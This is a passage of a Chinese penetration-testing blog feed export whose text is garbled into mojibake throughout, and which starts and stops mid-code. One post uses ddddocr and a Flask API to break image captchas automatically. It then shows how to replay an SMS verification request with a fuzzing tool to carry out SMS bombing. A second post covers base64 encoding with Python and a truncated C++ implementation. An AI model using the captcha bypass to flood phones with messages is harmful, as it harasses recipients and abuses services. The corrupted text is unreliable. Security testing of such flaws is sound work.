qFidufocYroNX+GHxV8Wwfbde1CKSXGVtJLgfKf91BsH4VZ+FHxEvfDviBPBviC3jjRpPIjlChWjkHADeoPrQB9E0UUUAFFFFABXnvxk8Sv4c8CzPazGO8mljWIg9PmycjuCFII/2q9CrhPiR8PX8f29jbDUBaQwOZHzHvJOMDHIxwWz+HpQB5t8OvhNpXibwLFqU1zd2Wq+ezW95bMUeIBVG1l6HDBiCMEgjmuk/tb4l/DsY1e0XxZokf/L3b5FzGvqw6n1OQf94V6N4U8Ow+FPDlpo0FzLcR24IEkuNxyST0HTJNbVAHnem/FrwL4kjSG4vorZpF/wBTfr5ZXPBUk/L0PYnIPrXm/wAa9M8Mp4a0+/0Wa3mne5bdLEUJdOeCRgnBPoSe5PWvQvGvwtg1y5kvtOWCK5cEEGMHBIYZ+bKlecldoORkMOQePsfgHb3+qyXV/utbJ2AW3s5mTy8DBOZEJOSM+nPWgDq/gpY3lj4R23sTpMSSDIjjKn7pAboCMfUbewBMHjH4i+HrmxvtE1ICC8iYf6NP0ds/u1YgjAzgt1wMjnINaVh4A8ReGLUW3hbxg0VohLLZ6hYxyoSf9tQrCud8R+DfGXiK4lGreGfDV5J5JRLu3uXhG48B8MCdy9geOe+BgA4f4FagLHxrcWc1w0ksoMSqrDG3O53z35RBjuHY9q+kdU1S00fS7jUbyTbbQLukZRnA/wAmvm6f4G+MUvhc6baWlkVA2BNRLFSFwTkqDyefxPQdOu8M+EviToljd2WoWGn6vbXBBZLzUW42gBcYBxjB+ueelAHT3/x08EWcBeK+lupO0cULZP4kYFfOuoX9944+IbX9hatHNd3KtGkYz5YyMEn2617JbfDjUraQOvw78NuR08zU5GH5Fea7fwjput2GpbLzwnoWl2mw/vrKfe+7sMbRx+NAHbqSVBIwSOR6UUtFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAf//Z&quot;</span></span><br><span class="line">    ocr = DdddOcr()</span><br><span class="line">    code = ocr.classification(base64.b64decode(base64_str))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(code)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012232942.png" alt="image.png"> </p><p>ä¹Ÿå¯ä»¥ä½¿ç”¨wiresharkå…¨å±€æŠ“åŒ…ï¼Œçœ‹åˆ°å…¶å®dddocrå¤„ç†çš„å°±æ˜¯å›¾ç‰‡çš„base64ç¼–ç éƒ¨åˆ†ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012233622.png" alt="image.png"> </p><p>2ã€è¿™å—æ–°å»ºæµç¨‹ï¼Œä½¿ç”¨flaskè°ƒç”¨dddocrï¼Œå®ç°éªŒè¯ç å›¾ç‰‡è¯†åˆ«</p><p>å¯¹apiè¯·æ±‚è·å–è¯†åˆ«åçš„éªŒè¯ç ï¼Œä¸¢å…¥APIè¯·æ±‚åï¼Œåœ¨è¯·æ±‚å¤´ä¸­æ’å…¥æå–çš„imageå†…å®¹ç»‘å®šçš„å˜é‡</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012233689.png" alt="img"> </p><p>ç»‘å®šå˜é‡çš„æ—¶å€™è¦æ³¨æ„ï¼Œéœ€è¦é€‰æ‹©ã€æå–åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼çš„æ•°æ®ã€‘ï¼Œç„¶åå°†è¯†åˆ«åçš„éªŒè¯ç é€šè¿‡æ­£åˆ™æå–å‡ºæ¥</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012233767.png" alt="img"> </p><p>ã€æ³¨ã€‘è¿™å—è¦æ³¨æ„åƒä¸‡ä¸è¦é€‰æ‹©â€œæå–å®Œæ•´å“åº”æ•°æ®â€ï¼Œè¿™å—çš„å“åº”æ•°æ®æ˜¯å“åº”åŒ…ï¼Œä¸æ˜¯å“åº”ä½“</p><h3 id="å®Œæ•´æµç¨‹"><a href="#å®Œæ•´æµç¨‹" class="headerlink" title="å®Œæ•´æµç¨‹"></a>å®Œæ•´æµç¨‹</h3><p>è·å–åˆ°å›¾å½¢éªŒè¯ç å“åº”ä½“-&gt;æå–ID &amp;&amp; æå–image-&gt;apiæ¥å£è¯†åˆ«éªŒè¯ç </p><h2 id="çŸ­ä¿¡è½°ç‚¸"><a href="#çŸ­ä¿¡è½°ç‚¸" class="headerlink" title="çŸ­ä¿¡è½°ç‚¸"></a>çŸ­ä¿¡è½°ç‚¸</h2><p>ä½¿ç”¨httpæŠ“åŒ…å·¥å…·ï¼ŒæŠ“å–åˆ°å‘é€éªŒè¯ç çš„æ•°æ®åŒ…ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012233790.png" alt="image.png"> </p><p>å°†å…¶å‘é€åˆ°httpæ¨¡ç³Šæµ‹è¯•å·¥å…·ï¼Œåœ¨éªŒè¯ç è¯·æ±‚çš„ä½ç½®æ’å…¥å¯¹åº”å˜é‡</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012233849.png" alt="img"> </p><p>è®¾ç½®çˆ†ç ´æ¨¡å¼ä¸ºã€æ— å€¼é‡æ”¾ã€‘æ¨¡å¼ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012234744.png" alt="image.png"> </p><p>ç„¶åè¿›å…¥æµ‹è¯•è¿‡ç¨‹è¿›è¡Œæµ‹è¯•é…ç½®</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012234392.png" alt="image.png"> </p><p>ç‚¹å‡»ã€å¼€å§‹ã€‘æˆåŠŸçˆ†ç ´</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012234061.png" alt="image.png"> </p><p>å¯ä»¥ç‚¹å‡»æŸ¥çœ‹è¯·æ±‚å‚æ•°ï¼Œå¯ä»¥çœ‹åˆ°è‡ªå®šä¹‰æµç¨‹ä¸­çš„æ•°æ®éƒ½åœ¨æ­¤å¤„æœ‰ä½“ç°ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012234847.png" alt="image.png"> </p><p> <img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012244288.png" alt="image-20240601224441268"> </p><h1 id="å››ã€æ€»ç»“"><a href="#å››ã€æ€»ç»“" class="headerlink" title="å››ã€æ€»ç»“"></a>å››ã€æ€»ç»“</h1><p>æ•´ä¸ªæµç¨‹ä¸­æœ‰å‡ ä¸ªåœ°æ–¹éœ€è¦æ³¨æ„ä¸€ä¸‹ï¼Œæ¯”è¾ƒå®¹æ˜“å‡ºé—®é¢˜ã€‚</p><h2 id="Bug-éªŒè¯ç è¯†åˆ«çš„æµç¨‹ä¸èƒ½æµ‹è¯•"><a href="#Bug-éªŒè¯ç è¯†åˆ«çš„æµç¨‹ä¸èƒ½æµ‹è¯•" class="headerlink" title="Bug-éªŒè¯ç è¯†åˆ«çš„æµç¨‹ä¸èƒ½æµ‹è¯•"></a>Bug-éªŒè¯ç è¯†åˆ«çš„æµç¨‹ä¸èƒ½æµ‹è¯•</h2><p>åœ¨å‰é¢è‡ªå®šä¹‰æµç¨‹ä¸­ï¼Œæœ€åä¸€ä¸ªæµç¨‹ï¼Œè®¾ç½®å˜é‡ï¼Œä½¿ç”¨dddocrè¯†åˆ«éªŒè¯ç </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012235449.png" alt="image.png"> </p><p>è¿™å—çš„ã€æµ‹è¯•ã€‘é€‰é¡¹ï¼Œæ˜¯æ²¡å•¥ç”¨çš„ï¼ŒåŠ è½½ä¸ä¸Šæˆ‘ä»¬è®¾ç½®çš„å˜é‡ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012235979.png" alt="img"> </p><p>å¯ä»¥wiresharkæŠ“åŒ…æµ‹è¯•æŸ¥çœ‹ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012235007.png" alt="img"> </p><p>åˆšå¼€å§‹çš„æ—¶å€™ï¼Œæµªè´¹äº†åŠä¸ªå°æ—¶ï¼Œä¸€ç›´æé‚£å„¿æµ‹è¯•ï¼Œæ‰¾åŸå› ã€‚åŸå…ˆä»¥ä¸ºæ˜¯ re_imageçš„æ­£åˆ™å†™é”™äº†ï¼Œæ’äº†å¥½ä¹…ï¼Œä¸€ç›´æ²¡æœ‰è¿”å›ã€‚åŸæ¥æ˜¯åŠŸèƒ½ç‚¹çš„bugï¼</p><h2 id="tip-éªŒè¯ç è¯†åˆ«ç»“æœæ­£åˆ™åŒ¹é…"><a href="#tip-éªŒè¯ç è¯†åˆ«ç»“æœæ­£åˆ™åŒ¹é…" class="headerlink" title="tip-éªŒè¯ç è¯†åˆ«ç»“æœæ­£åˆ™åŒ¹é…"></a>tip-éªŒè¯ç è¯†åˆ«ç»“æœæ­£åˆ™åŒ¹é…</h2><p>è¿˜æ˜¯åŒæ ·çš„ä½ç½®ï¼Œéœ€è¦æ³¨æ„ç»‘å®šå˜é‡çš„æ—¶å€™ï¼Œéœ€è¦é€‰æ‹©ã€æå–åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼çš„æ•°æ®ã€‘ï¼Œç„¶åå°†è¯†åˆ«åçš„éªŒè¯ç é€šè¿‡æ­£åˆ™æå–å‡ºæ¥</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012235544.png" alt="img"> </p><p>è¿™å—åƒä¸‡ä¸è¦é€‰æ‹©â€œæå–å®Œæ•´å“åº”æ•°æ®â€ï¼Œè¿™å—çš„å“åº”æ•°æ®æŒ‡çš„æ˜¯æ˜¯å“åº”åŒ…ï¼Œä¸æ˜¯å“åº”ä½“</p><p>è¿™æ ·å­æå–å‡ºæ¥çš„å°±æ˜¯æ•´ä¸ªå“åº”æ•°æ®åŒ…äº†ï¼Œè‚¯å®šä¸æ˜¯æˆ‘ä»¬è¦çš„ä¸œè¥¿ã€‚</p><h2 id="tip-è‡ªå®šä¹‰æµç¨‹é¡ºåºå¾ˆé‡è¦"><a href="#tip-è‡ªå®šä¹‰æµç¨‹é¡ºåºå¾ˆé‡è¦" class="headerlink" title="tip-è‡ªå®šä¹‰æµç¨‹é¡ºåºå¾ˆé‡è¦"></a>tip-è‡ªå®šä¹‰æµç¨‹é¡ºåºå¾ˆé‡è¦</h2><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012235530.png" alt="img"></p><p>1ã€get_yzmï¼šé€šè¿‡æ¥å£è·å–åˆ°éªŒè¯ç å“åº”ä½“ï¼ˆåŒ…æ‹¬codeå’Œcodeidï¼‰</p><p>2ã€re_idï¼šæ­£åˆ™åŒ¹é…ï¼Œä»get_yzmä¸­è·å–åˆ°codeid</p><p>3ã€re_imageï¼šæ­£åˆ™åŒ¹é…ï¼Œä»get_yzmä¸­è·å–åˆ°codeçš„base64ç¼–ç </p><p>4ã€get_imageï¼šé€šè¿‡flaskè°ƒç”¨ddddocræ¥å£ï¼Œè¯†åˆ«éªŒè¯ç ï¼Œè·å¾—code</p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å›¾ç‰‡éªŒè¯ç  </tag>
            
            <tag> ddddocr </tag>
            
            <tag> TangGo </tag>
            
            <tag> çŸ­ä¿¡è½°ç‚¸ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç®—æ³•è¿˜åŸä¹‹base64</title>
      <link href="/2024/05/16/%E7%AE%97%E6%B3%95%E8%BF%98%E5%8E%9F%E4%B9%8Bbase64/"/>
      <url>/2024/05/16/%E7%AE%97%E6%B3%95%E8%BF%98%E5%8E%9F%E4%B9%8Bbase64/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="åŸºç¡€æ¦‚å¿µ"><a href="#åŸºç¡€æ¦‚å¿µ" class="headerlink" title="åŸºç¡€æ¦‚å¿µ"></a>åŸºç¡€æ¦‚å¿µ</h1><h2 id="åŠ å¯†ä¸è§£å¯†çš„å…³ç³»"><a href="#åŠ å¯†ä¸è§£å¯†çš„å…³ç³»" class="headerlink" title="åŠ å¯†ä¸è§£å¯†çš„å…³ç³»"></a>åŠ å¯†ä¸è§£å¯†çš„å…³ç³»</h2><ol><li><strong>åŠ å¯†</strong>ï¼šæ˜¯å°†åŸå§‹çš„ã€å¯è¯»çš„ä¿¡æ¯ï¼ˆæ˜æ–‡ï¼‰è½¬æ¢ä¸ºå¦ä¸€ç§å½¢å¼ï¼ˆå¯†æ–‡ï¼‰çš„è¿‡ç¨‹ï¼Œè¿™æ ·å°±å¯ä»¥é˜²æ­¢æœªæˆæƒçš„è®¿é—®ã€‚åŠ å¯†ç®—æ³•å’Œå¯†é’¥ç”¨äºè¿™ä¸€è½¬æ¢è¿‡ç¨‹ã€‚åŠ å¯†çš„ç›®çš„æ˜¯ç¡®ä¿ä¿¡æ¯çš„æœºå¯†æ€§ï¼Œå³ä½¿å¯†æ–‡åœ¨ä¼ è¾“æˆ–å­˜å‚¨è¿‡ç¨‹ä¸­è¢«æˆªè·ï¼Œæ²¡æœ‰æ­£ç¡®çš„å¯†é’¥ä¹Ÿæ— æ³•ç†è§£å…¶å†…å®¹ã€‚</li><li><strong>è§£å¯†</strong>ï¼šæ˜¯åŠ å¯†çš„é€†è¿‡ç¨‹ï¼Œå®ƒå°†å¯†æ–‡è½¬æ¢å›åŸå§‹çš„æ˜æ–‡ã€‚åªæœ‰æ‹¥æœ‰æ­£ç¡®å¯†é’¥çš„äººæ‰èƒ½è§£å¯†ä¿¡æ¯å¹¶è·å–åŸå§‹å†…å®¹ã€‚</li></ol><p>åŠ å¯†å’Œè§£å¯†çš„å…³ç³»å¯ä»¥æ¦‚æ‹¬ä¸ºä»¥ä¸‹å‡ ç‚¹ï¼š</p><ul><li><strong>äº’ä¸ºé€†è¿‡ç¨‹</strong>ï¼šåŠ å¯†å’Œè§£å¯†ä½¿ç”¨ç›¸åŒç±»å‹çš„ç®—æ³•ï¼Œä½†æ‰§è¡Œç›¸åçš„æ“ä½œã€‚åŠ å¯†ç®—æ³•è®¾è®¡æ—¶å¿…é¡»ç¡®ä¿å¯ä»¥é€†å‘æ“ä½œï¼Œä»¥ä¾¿è§£å¯†ã€‚</li><li><strong>å¯†é’¥çš„ä½¿ç”¨</strong>ï¼šåŠ å¯†å’Œè§£å¯†é€šå¸¸ä¾èµ–äºå¯†é’¥ã€‚åœ¨åŠ å¯†è¿‡ç¨‹ä¸­ä½¿ç”¨å¯†é’¥ç”Ÿæˆå¯†æ–‡ï¼Œåœ¨è§£å¯†è¿‡ç¨‹ä¸­ä½¿ç”¨ç›¸åŒçš„å¯†é’¥ä»å¯†æ–‡æ¢å¤æ˜æ–‡ã€‚å¯†é’¥çš„å®‰å…¨ç®¡ç†æ˜¯åŠ å¯†ç³»ç»Ÿèƒ½å¦æœ‰æ•ˆå·¥ä½œçš„å…³é”®ã€‚</li><li><strong>å®‰å…¨æ€§</strong>ï¼šåŠ å¯†ç³»ç»Ÿçš„è®¾è®¡ç›®æ ‡æ˜¯ç¡®ä¿å³ä½¿æ”»å‡»è€…çŸ¥é“åŠ å¯†ç®—æ³•ï¼Œä¹Ÿæ— æ³•åœ¨æ²¡æœ‰å¯†é’¥çš„æƒ…å†µä¸‹è§£å¯†ä¿¡æ¯ã€‚å› æ­¤ï¼ŒåŠ å¯†ç®—æ³•é€šå¸¸æ˜¯å…¬å¼€çš„ï¼Œè€Œå¯†é’¥åˆ™å¿…é¡»ä¿å¯†ã€‚</li><li><strong>åº”ç”¨åœºæ™¯</strong>ï¼šåŠ å¯†å’Œè§£å¯†å¹¿æ³›åº”ç”¨äºå¤šç§åœºæ™¯ï¼Œå¦‚ç½‘ç»œå®‰å…¨ä¸­çš„æ•°æ®ä¼ è¾“ã€æ•°æ®å­˜å‚¨ã€æ•°å­—ç­¾åç­‰ï¼Œä»¥ç¡®ä¿ä¿¡æ¯çš„ä¿å¯†æ€§ã€å®Œæ•´æ€§å’Œå¯ç”¨æ€§ã€‚</li></ul><p>åœ¨ç°ä»£å¯†ç å­¦ä¸­ï¼ŒåŠ å¯†å’Œè§£å¯†ç®—æ³•å¤šç§å¤šæ ·ï¼ŒåŒ…æ‹¬å¯¹ç§°åŠ å¯†ï¼ˆå¦‚AESï¼‰ã€éå¯¹ç§°åŠ å¯†ï¼ˆå¦‚RSAï¼‰ã€æ•£åˆ—å‡½æ•°ç­‰ï¼Œå®ƒä»¬åœ¨ä¸åŒçš„åº”ç”¨åœºæ™¯ä¸­æä¾›äº†ä¸åŒçº§åˆ«çš„å®‰å…¨æ€§ã€‚</p><h2 id="åŠ å¯†çš„ç®€å•åˆ†ç±»"><a href="#åŠ å¯†çš„ç®€å•åˆ†ç±»" class="headerlink" title="åŠ å¯†çš„ç®€å•åˆ†ç±»"></a>åŠ å¯†çš„ç®€å•åˆ†ç±»</h2><p>åŠ å¯†æŠ€æœ¯å¯ä»¥åˆ†ä¸ºå‡ ä¸ªåŸºæœ¬ç±»åˆ«ï¼Œæ¯ä¸ªç±»åˆ«éƒ½æœ‰å…¶ç‰¹å®šçš„ç”¨é€”å’Œç‰¹ç‚¹ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›ç®€å•çš„åˆ†ç±»ï¼š</p><ol><li><p><strong>å¯¹ç§°åŠ å¯†ï¼ˆSymmetric Encryptionï¼‰</strong>ï¼š</p><ul><li>ä½¿ç”¨ç›¸åŒçš„å¯†é’¥è¿›è¡ŒåŠ å¯†å’Œè§£å¯†ã€‚</li></ul><ul><li><p>é€Ÿåº¦å¿«ï¼Œé€‚ç”¨äºå¤§é‡æ•°æ®çš„åŠ å¯†ã€‚</p></li><li><p>å…¸å‹çš„ç®—æ³•åŒ…æ‹¬AESï¼ˆAdvanced Encryption Standardï¼‰ã€DESï¼ˆData Encryption Standardï¼‰ã€3DESï¼ˆTriple Data Encryption Algorithmï¼‰ç­‰ã€‚</p></li></ul></li><li><p><strong>éå¯¹ç§°åŠ å¯†ï¼ˆAsymmetric Encryptionï¼‰</strong>ï¼š</p><ul><li>ä½¿ç”¨ä¸€å¯¹å¯†é’¥ï¼šå…¬é’¥å’Œç§é’¥ã€‚å…¬é’¥ç”¨äºåŠ å¯†ï¼Œç§é’¥ç”¨äºè§£å¯†ã€‚</li></ul><ul><li><p>å®‰å…¨æ€§é«˜ï¼Œä½†é€Ÿåº¦è¾ƒæ…¢ï¼Œé€‚ç”¨äºå°é‡æ•°æ®çš„åŠ å¯†ã€‚</p></li><li><p>å…¸å‹çš„ç®—æ³•åŒ…æ‹¬RSAã€ECCï¼ˆElliptic Curve Cryptographyï¼‰ã€Diffie-Hellmanç­‰ã€‚</p></li></ul></li><li><p><strong>å“ˆå¸Œå‡½æ•°ï¼ˆHash Functionsï¼‰</strong>ï¼š</p><ul><li>å°†è¾“å…¥ï¼ˆæ— è®ºå¤§å°ï¼‰æ˜ å°„åˆ°ä¸€ä¸ªå›ºå®šé•¿åº¦çš„å“ˆå¸Œå€¼ã€‚</li></ul><ul><li><p>ç”¨äºç¡®ä¿æ•°æ®çš„å®Œæ•´æ€§ï¼Œå› ä¸ºå³ä½¿è¾“å…¥æ•°æ®æœ‰å¾ˆå°çš„å˜åŒ–ï¼Œå“ˆå¸Œå€¼ä¹Ÿä¼šå‘ç”Ÿæ˜¾è‘—å˜åŒ–ã€‚</p></li><li><p>ä¸æ˜¯åŠ å¯†ç®—æ³•ï¼Œå› ä¸ºå“ˆå¸Œæ˜¯ä¸å¯é€†çš„ï¼Œä¸èƒ½ç”¨äºè§£å¯†ã€‚</p></li><li><p>å…¸å‹çš„ç®—æ³•åŒ…æ‹¬MD5ã€SHA-1ã€SHA-256ç­‰ã€‚</p></li></ul></li></ol><h1 id="å®ç°æ ‡å‡†çš„base64"><a href="#å®ç°æ ‡å‡†çš„base64" class="headerlink" title="å®ç°æ ‡å‡†çš„base64"></a>å®ç°æ ‡å‡†çš„base64</h1><h2 id="1-base64åŸç†"><a href="#1-base64åŸç†" class="headerlink" title="1. base64åŸç†"></a>1. base64åŸç†</h2><p>Base64ç¼–ç çš„åŸç†æ˜¯å°†æ¯ä¸‰ä¸ªå­—èŠ‚çš„æ•°æ®ï¼ˆå…±24ä½ï¼‰åˆ’åˆ†ä¸ºå››ä¸ª6ä½çš„æ®µï¼Œç„¶åæ¯ä¸ª6ä½çš„æ®µè½¬æ¢ä¸ºä¸€ä¸ªå¯¹åº”çš„å¯æ‰“å°å­—ç¬¦ã€‚Base64ç¼–ç è¡¨åŒ…å«64ä¸ªå­—ç¬¦ï¼š<strong>å¤§å†™å­—æ¯Aåˆ°Z</strong>ã€<strong>å°å†™å­—æ¯aåˆ°z</strong>ã€<strong>æ•°å­—0åˆ°9</strong>ã€<strong>åŠ å·ï¼ˆ+ï¼‰å’Œæ–œæ ï¼ˆ&#x2F;ï¼‰</strong>ã€‚</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªPythonçš„ä»£ç ç¤ºä¾‹ï¼Œå±•ç¤ºäº†å¦‚ä½•å®ç°æ ‡å‡†çš„base64ç¼–ç å’Œè§£ç </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¼–ç </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_base64</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è§£ç </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_base64</span>(<span class="params">encoded_data</span>):</span><br><span class="line">    <span class="keyword">return</span> base64.b64decode(encoded_data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¤ºä¾‹</span></span><br><span class="line">original_data = <span class="string">b&#x27;Hello, World!&#x27;</span></span><br><span class="line">encoded_data = encode_base64(original_data)</span><br><span class="line">decoded_data = decode_base64(encoded_data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Original data: <span class="subst">&#123;original_data&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Encoded data: <span class="subst">&#123;encoded_data&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Decoded data: <span class="subst">&#123;decoded_data&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼ŒBase64ç¼–ç å¹¶ä¸æ˜¯ä¸€ç§åŠ å¯†æ–¹æ³•ï¼Œå®ƒä¸æä¾›æ•°æ®çš„å®‰å…¨æ€§ï¼Œåªæ˜¯å°†æ•°æ®è½¬æ¢æˆä¸€ç§é€‚åˆåœ¨ä¸åŒç³»ç»Ÿé—´ä¼ è¾“çš„æ ¼å¼</p><h2 id="2-ç¤ºä¾‹è¯´æ˜"><a href="#2-ç¤ºä¾‹è¯´æ˜" class="headerlink" title="2. ç¤ºä¾‹è¯´æ˜"></a>2. ç¤ºä¾‹è¯´æ˜</h2><p>å‡è®¾è¦å¯¹å­—ç¬¦ä¸² â€œManâ€ è¿›è¡Œbase64ç¼–ç ï¼Œæ•´ä¸ªè¿‡ç¨‹å¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161502428.jpeg" alt="img"> </p><p>ç¬¬ä¸€æ­¥ï¼šâ€œMâ€ã€â€œaâ€ã€â€nâ€å¯¹åº”çš„ASCIIç å€¼åˆ†åˆ«ä¸º77ï¼Œ97ï¼Œ110ï¼Œå¯¹åº”çš„äºŒè¿›åˆ¶å€¼æ˜¯01001101ã€01100001ã€01101110ã€‚å¦‚å›¾ç¬¬äºŒä¸‰è¡Œæ‰€ç¤ºï¼Œç”±æ­¤ç»„æˆä¸€ä¸ª24ä½çš„äºŒè¿›åˆ¶å­—ç¬¦ä¸²ã€‚</p><p>ç¬¬äºŒæ­¥ï¼šå¦‚å›¾çº¢è‰²æ¡†ï¼Œå°†24ä½æ¯6ä½äºŒè¿›åˆ¶ä½ä¸€ç»„åˆ†æˆå››ç»„ã€‚</p><p>ç¬¬ä¸‰æ­¥ï¼šåœ¨ä¸Šé¢æ¯ä¸€ç»„å‰é¢è¡¥ä¸¤ä¸ª0ï¼Œæ‰©å±•æˆ32ä¸ªäºŒè¿›åˆ¶ä½ï¼Œæ­¤æ—¶å˜ä¸ºå››ä¸ªå­—èŠ‚ï¼š00010011ã€00010110ã€00000101ã€00101110ã€‚åˆ†åˆ«å¯¹åº”çš„å€¼ï¼ˆBase64ç¼–ç ç´¢å¼•ï¼‰ä¸ºï¼š19ã€22ã€5ã€46ã€‚</p><p>ç¬¬å››æ­¥ï¼šç”¨ä¸Šé¢çš„å€¼åœ¨Base64ç¼–ç è¡¨ä¸­è¿›è¡ŒæŸ¥æ‰¾ï¼Œåˆ†åˆ«å¯¹åº”ï¼šTã€Wã€Fã€uã€‚å› æ­¤â€œManâ€Base64ç¼–ç ä¹‹åå°±å˜ä¸ºï¼šTWFuã€‚</p><p><strong>ä½æ•°ä¸è¶³æƒ…å†µ</strong></p><p>ä¸Šé¢æ˜¯æŒ‰ç…§ä¸‰ä¸ªå­—èŠ‚æ¥ä¸¾ä¾‹è¯´æ˜çš„ï¼Œå¦‚æœå­—èŠ‚æ•°ä¸è¶³ä¸‰ä¸ªï¼Œé‚£ä¹ˆè¯¥å¦‚ä½•å¤„ç†ï¼Ÿ</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161503074.png" alt="img"> </p><p><strong>ä¸¤ä¸ªå­—èŠ‚</strong>ï¼šä¸¤ä¸ªå­—èŠ‚å…±16ä¸ªäºŒè¿›åˆ¶ä½ï¼Œä¾æ—§æŒ‰ç…§è§„åˆ™è¿›è¡Œåˆ†ç»„ã€‚æ­¤æ—¶æ€»å…±16ä¸ªäºŒè¿›åˆ¶ä½ï¼Œæ¯6ä¸ªä¸€ç»„ï¼Œåˆ™ç¬¬ä¸‰ç»„ç¼ºå°‘2ä½ï¼Œç”¨0è¡¥é½ï¼Œå¾—åˆ°ä¸‰ä¸ªBase64ç¼–ç ï¼Œç¬¬å››ç»„å®Œå…¨æ²¡æœ‰æ•°æ®åˆ™ç”¨ â€œ&#x3D;â€ è¡¥ä¸Šã€‚å› æ­¤ï¼Œä¸Šå›¾ä¸­â€œBCâ€è½¬æ¢ä¹‹åä¸ºâ€œQKM&#x3D;â€ï¼›</p><p><strong>ä¸€ä¸ªå­—èŠ‚</strong>ï¼šä¸€ä¸ªå­—èŠ‚å…±8ä¸ªäºŒè¿›åˆ¶ä½ï¼Œä¾æ—§æŒ‰ç…§è§„åˆ™è¿›è¡Œåˆ†ç»„ã€‚æ­¤æ—¶å…±8ä¸ªäºŒè¿›åˆ¶ä½ï¼Œæ¯6ä¸ªä¸€ç»„ï¼Œåˆ™ç¬¬äºŒç»„ç¼ºå°‘4ä½ï¼Œç”¨0è¡¥é½ï¼Œå¾—åˆ°ä¸¤ä¸ªBase64ç¼–ç ï¼Œè€Œåé¢ä¸¤ç»„æ²¡æœ‰å¯¹åº”æ•°æ®ï¼Œéƒ½ç”¨â€œ&#x3D;â€è¡¥ä¸Šã€‚å› æ­¤ï¼Œä¸Šå›¾ä¸­â€œAâ€è½¬æ¢ä¹‹åä¸ºâ€œQQ&#x3D;&#x3D;â€ï¼›</p><h2 id="3-base64å®ç°"><a href="#3-base64å®ç°" class="headerlink" title="3. base64å®ç°"></a>3. base64å®ç°</h2><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161514951.png" alt="image.png"> </p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//å®šä¹‰base64çš„ç§å­</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span> base64en[] = &#123;</span><br><span class="line">        <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>,  <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>,  <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>,   <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span 